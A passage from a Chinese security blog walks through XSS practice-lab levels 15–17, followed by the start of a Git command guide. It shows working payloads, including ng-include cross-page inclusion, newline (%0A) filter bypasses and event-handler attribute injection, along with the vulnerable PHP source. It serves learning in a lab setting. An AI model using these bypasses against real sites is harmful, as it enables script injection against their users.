<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_52.png" class="" title="在这里插入图片描述">
<p>展示了很多项信息，随便修改图片的某一项为xss攻击代码即可通关</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_53.png" class="" title="在这里插入图片描述">
<p>有自动弹窗</p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>解题思路：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_54.png" class="" title="在这里插入图片描述">
<blockquote>
<p>页面技术特征<br>1.AngularJS 框架：代码引入了 angular.min.js，说明页面依赖 AngularJS 动态渲染内容。<br>2.未实现的 ngInclude：注释 <!-- ngInclude: undefined --> 表明存在一个未完成的动态内容加载逻辑，可能需通过特定操作触发</p>
</blockquote>
<h3 id="AngularJS与指令ng-inlcude"><a href="#AngularJS与指令ng-inlcude" class="headerlink" title="*AngularJS与指令ng-inlcude"></a>*AngularJS与指令ng-inlcude</h3><blockquote>
<ol>
<li>ng - include指令特性<blockquote>
<p>ng - include是 Angular JS 框架中的指令，用于在 HTML 页面中动态包含外部文件或片段，通过浏览器的 XHR 请求加载外部文件（需确保文件在同一域名下可访问）。它与服务器端的文件包含（如 PHP）不同，是在浏览器端请求并加载文件内容，然后将其插入到当前页面指定位置。</p>
</blockquote>
</li>
</ol>
</blockquote>
<p>攻击原理：</p>
<blockquote>
<p>默认情况下的，ng-include 只能加载当前页面同源的（相同域名，协议，端口）的文件<br>ng - include加载level1.php时，将name&#x3D;[script]alert(&#x2F;xss&#x2F;)[&#x2F;script]作为参数传递给level1.php。<br>由于level1.php未对name参数做严格过滤，浏览器解析level1.php返回的 HTML 时，会执行恶意脚本alert(&#x2F;xss&#x2F;)，从而触发 XSS 攻击。</p>
</blockquote>
<p>关卡：</p>
<blockquote>
<p>本关漏洞利用分析<br>1.当前关卡过滤：</p>
<blockquote>
<p>传入的src参数会被htmlspecialchars()函数过滤，直接注入script等敏感标签会被转义，无法直接触发 XSS。</p>
</blockquote>
<p>2.结合其他页面漏洞：</p>
<blockquote>
<p>靶场中其他页面（如level1.php）存在 XSS 漏洞（假设name参数输入未过滤）</p>
</blockquote>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">利用ng - include的文件包含特性，构造 Payload：</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;        	//不行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(&quot;123&quot;)&#x27;</span>&gt;</span>&#x27;	   //不行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&#x27;  	  //不行</span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span>&quot;       //不行</span><br><span class="line"></span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&quot;    //行</span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&quot;     //行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span>&#x27;    //行</span><br><span class="line"></span><br><span class="line"> - 用img标签行</span><br><span class="line"> - onerror外不套单双引号，让浏览器容错，防止过多的单双引号让浏览器识别错误</span><br><span class="line"></span><br><span class="line">为什么有些语句为什么不行呢？</span><br><span class="line">因为语句要考虑的不仅仅是本关的过滤，也要考虑引用对应关卡的过滤</span><br></pre></td></tr></table></figure>

<p>关键流程总结</p>
<blockquote>
<p>ng - include通过浏览器请求加载level1.php，传递带有恶意脚本的参数。<br>存在漏洞的level1.php接收参数后，未过滤直接回显恶意脚本到页面。<br>浏览器解析执行恶意脚本，完成 XSS 攻击。</p>
</blockquote>
<p>这种利用方式绕过了当前关卡的过滤，借助ng - include的特性和其他页面的 XSS 漏洞，实现了跨页面的脚本攻击。</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第<span class="number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];   <span class="comment">//获取src的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;  <span class="comment">//实例化转义--&gt;因此本关的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>解题思路：</p>
<p>类型：输入框类型</p>
<p>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>网页回显情况：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_55.png" class="" title="在这里插入图片描述">
<p>查看实例化情况：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_56.png" class="" title="在这里插入图片描述">

<p>此时的页面渲染:</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_57.png" class="" title="在这里插入图片描述">


<p>补充知识：center标签</p>
<blockquote>
<p>[center]标签的作用：将包裹的文本、图片或其他元素在父容器中水平居中显示。<br>HTML4 及更早版本支持 center，但 HTML5 已将其废弃。<br>被弃用的原因：<br>1.HTML 应专注于结构（如标题、段落），样式应交给 CSS 控制。<br>2.维护性和灵活性差：混合样式与结构，导致代码难以维护。<br>3.无法适应复杂布局（如响应式设计）。<br>重点：center 标签内嵌套 script 标签，其中的 JavaScript 代码仍会被浏览器执行</p>
</blockquote>
<p>解读回显信息：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span> -&gt;   &lt;</span><br><span class="line"><span class="symbol">&amp;gt;</span> -&gt;   &gt;</span><br><span class="line"><span class="symbol">&amp;nbsp;</span> -&gt; 空格</span><br><span class="line"><span class="symbol">&amp;amp;</span> -&gt; &amp;</span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span>alert(&quot;123&quot;);<span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span> 即为：</span><br><span class="line">&lt; &gt;alert(&quot;123&quot;);&lt;  &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>括号内的双引号没有实例化转义或被替换</li>
<li>特殊符号 &lt; &gt;  空格  &amp; 号被实例化转义</li>
<li>script标签缺失，准确来说被替换为空格</li>
</ul>
<p>换标签：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span> </span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_58.png" class="" title="在这里插入图片描述">
<h3 id="换行符绕过"><a href="#换行符绕过" class="headerlink" title="*换行符绕过"></a>*换行符绕过</h3><p>在 XSS 攻击中，<strong>换行符绕过过滤</strong>的核心原理是利用浏览器与过滤规则对换行符（<code>\n</code> 或 <code>%0A</code>）的解析差异，使得恶意代码能够绕过安全检测，同时被浏览器正常执行。以下是详细解释和应用场景：</p>
<p>绕过原理：</p>
<ol>
<li><p><strong>浏览器与过滤规则对换行符的解析差异</strong>  </p>
<ul>
<li><strong>浏览器</strong>：在 HTML 中，标签属性之间的换行符通常会被视为<strong>普通空格</strong>，甚至在某些情况下被直接忽略。  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span></span></span><br><span class="line"><span class="tag">   <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- 等同于 &lt;img src=x onerror=alert(1)&gt; --&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>过滤规则</strong>：可能未正确处理换行符，例如：  <ul>
<li>仅检测连续的关键字（如 <code>onerror</code>），但换行符将关键字拆分为 <code>on\nerror</code> 时，绕过黑名单。  </li>
<li>过滤空格但未过滤换行符，导致换行符成为替代分隔符。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>混淆代码结构</strong><br>通过换行符改变代码的视觉结构，使静态正则表达式或简单字符串匹配失效。例如：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x%0Aonerror</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- %0A 是 URL 编码的换行符 --&gt;</span></span><br></pre></td></tr></table></figure>
<p>应用场景：</p>
</li>
<li><p><strong>绕过空格过滤</strong></p>
</li>
</ol>
<ul>
<li><strong>场景</strong>：目标过滤了空格（如删除或转义为 <code>&amp;nbsp;</code>），但允许换行符。  </li>
<li><strong>利用方式</strong>：用换行符（<code>%0A</code>）替代空格分隔标签属性。  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=x%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器解析为 <code>&lt;img src=x onerror=alert(1)&gt;</code>。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p><strong>分割关键字</strong></p>
<ul>
<li><strong>场景</strong>：目标使用黑名单检测连续的关键字（如 <code>onerror</code>）。  </li>
<li><strong>利用方式</strong>：插入换行符拆分关键字，使其无法被正则表达式匹配。  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerr</span></span></span><br><span class="line"><span class="tag"><span class="attr">or</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器会将换行后的内容合并为 <code>onerror</code>，但过滤规则可能因换行符失效。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>绕过属性值闭合检测</strong></p>
<ul>
<li><strong>场景</strong>：目标检查属性值的闭合（如 <code>&quot;</code> 或 <code>&#39;</code>），但未处理换行符。  </li>
<li><strong>利用方式</strong>：在属性中插入换行符，构造未闭合的上下文：  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascri%0Apt:alert(1)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器可能忽略换行符，解析为 <code>javascript:alert(1)</code>。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>实际绕过示例：</p>
<p>示例 1：绕过空格过滤<br>假设目标过滤空格，但允许换行符：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=x%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>浏览器解析</strong>：<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code>  </li>
<li><strong>绕过效果</strong>：成功触发 <code>onerror</code> 事件。</li>
</ul>
<p>示例 2：分割敏感关键字<br>假设目标过滤 <code>onerror</code> 关键词：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerr</span></span></span><br><span class="line"><span class="tag"><span class="attr">or</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">即 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x%0Aonerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>浏览器解析</strong>：<code>onerror</code> 被合并，触发事件。  </li>
<li><strong>过滤规则</strong>：可能因换行符无法检测到 <code>onerror</code>。</li>
</ul>
<hr>
<p>由于script会被过滤，所以不使用<br>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Asrc=x%0Aonerror=alert(&#x27;123&#x27;)&gt;    不用双引号，因为被实例化转义</span><br></pre></td></tr></table></figure>

<p>成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level16&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="comment">//多个替换过滤  后端过滤了空格-&gt;&amp;nbsp;  未过滤换行符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str5</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>解题思路：</p>
<p>检查源码：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_59.png" class="" title="在这里插入图片描述">
<p>修改地址栏的b,源码也对应修改：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_60.png" class="" title="在这里插入图片描述">
<h3 id="趣事-2"><a href="#趣事-2" class="headerlink" title="*趣事"></a>*趣事</h3><p>将b修改为：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123 onclick=alert()</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_61.png" class="" title="在这里插入图片描述">

<ul>
<li>onclick 成一个属性</li>
</ul>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123 onmouseover=alert(&quot;123&quot;)</span><br></pre></td></tr></table></figure>

<p>鼠标悬放即可通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level17&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//变量获取之后，没有经过过滤就拼接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="服务器设置"><a href="#服务器设置" class="headerlink" title="服务器设置"></a>服务器设置</h1><p>开启php扩展设置php_exif  –&gt;图片读取功能</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zq-rookie-hacker.github.io/2024/12/10/git_note/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zhuzhuxia.jpg">
      <meta itemprop="name" content="ZQ-Rooie-Hacker">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/10/git_note/" class="post-title-link" itemprop="url">Git-Note</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-12-10 12:00:00" itemprop="dateCreated datePublished" datetime="2024-12-10T12:00:00+08:00">2024-12-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-05-11 10:30:00" itemprop="dateModified" datetime="2025-05-11T10:30:00+08:00">2025-05-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/" itemprop="url" rel="index"><span itemprop="name">知识杂碎</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>2.3k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>8 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Git-操作指南（终极整合版）"><a href="#Git-操作指南（终极整合版）" class="headerlink" title="Git 操作指南（终极整合版）"></a>Git 操作指南（终极整合版）</h1><h2 id="一、基础命令"><a href="#一、基础命令" class="headerlink" title="一、基础命令"></a>一、基础命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>git init</code></td>
<td>初始化一个新的 Git 仓库</td>
</tr>
<tr>
<td><code>git log</code></td>
<td>查看提交历史</td>
</tr>
<tr>
<td><code>git add [文件名]</code></td>
<td>将文件添加到暂存区（<code>git add .</code> 添加所有修改）</td>
</tr>
<tr>
<td><code>git commit -m &quot;提交信息&quot;</code></td>
<td>提交暂存区的更改到本地仓库</td>
</tr>
<tr>
<td><code>git status</code></td>
<td>查看当前仓库状态（修改、暂存、提交情况）</td>
</tr>
</tbody></table>
<h2 id="二、远程仓库管理"><a href="#二、远程仓库管理" class="headerlink" title="二、远程仓库管理"></a>二、远程仓库管理</h2><h3 id="添加-管理远程仓库"><a href="#添加-管理远程仓库" class="headerlink" title="添加&#x2F;管理远程仓库"></a>添加&#x2F;管理远程仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加远程仓库</span></span><br><span class="line">git remote add origin [仓库地址]</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPS 方式</span></span><br><span class="line">git remote add origin https://github.com/用户名/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 方式</span></span><br><span class="line">git remote add origin git@github.com:用户名/仓库.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改远程仓库地址</span></span><br><span class="line">git remote set-url origin [新地址]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看已配置的远程仓库</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

